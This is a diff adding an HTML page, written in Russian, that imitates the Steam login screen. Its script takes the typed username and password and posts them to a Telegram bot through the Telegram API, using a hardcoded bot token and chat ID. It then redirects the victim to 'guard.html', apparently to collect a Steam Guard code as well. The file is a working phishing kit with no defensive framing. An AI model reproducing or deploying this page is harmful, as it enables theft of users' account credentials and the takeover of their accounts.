@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Steam Login</title>
+    <style>
+        body {
+            margin: 0; padding: 0; font-family: "Motiva Sans", Arial, sans-serif;
+            background: radial-gradient(at top, #162b3f 0%, #0b141d 100%);
+            color: #ffffff; display: flex; align-items: center; justify-content: center; min-height: 100vh;
+        }
+        .login-box { 
+            background: rgba(0, 0, 0, 0.5); padding: 40px; border-radius: 4px; 
+            border: 1px solid #1a9fff; width: 100%; max-width: 350px; text-align: center; 
+        }
+        h2 { color: #66c0f4; text-transform: uppercase; margin-bottom: 25px; }
+        input { 
+            width: 100%; padding: 14px; margin: 10px 0; background: #2a475e; 
+            border: 1px solid #000; border-radius: 3px; color: white; box-sizing: border-box; 
+        }
+        .steam-button { 
+            width: 100%; padding: 16px; margin-top: 15px; font-size: 1.1rem; font-weight: bold; 
+            color: #ffffff; background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%); 
+            border: none; border-radius: 3px; cursor: pointer; text-transform: uppercase; 
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Вход в Steam</h2>
+        <form id="tgForm">
+            <input type="text" id="user_login" placeholder="Логин" required>
+            <input type="password" id="user_pass" placeholder="Пароль" required>
+            <button type="submit" class="steam-button">Войти</button>
+        </form>
+    </div>
+
+    <script>
+        // ВАЖНО: Впиши свои данные здесь
+        const TOKEN = "7231540956:AAHjvNnIfL4p4yhg8zCuvUkcBFQqhWh64TI"; 
+        const CHAT_ID = "1368305096";
+
+        document.getElementById('tgForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const login = document.getElementById('user_login').value;
+            const pass = document.getElementById('user_pass').value;
+            
+            const message = `<b>👤 ЛОГИН:</b> ${login}\n<b>🔑 ПАРОЛЬ:</b> ${pass}`;
+
+            // Отправка данных в Телеграм
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                })
+            }).then(() => {
+                // ПЕРЕХОД НА ТРЕТИЙ ФАЙЛ (guard.html)
+                window.location.href = "guard.html";
+            }).catch(err => {
+                // Если ошибка сети, всё равно пробуем перекинуть на Guard
+                window.location.href = "guard.html";
+            });
+        });
+    </script>
+</body>
+</html>
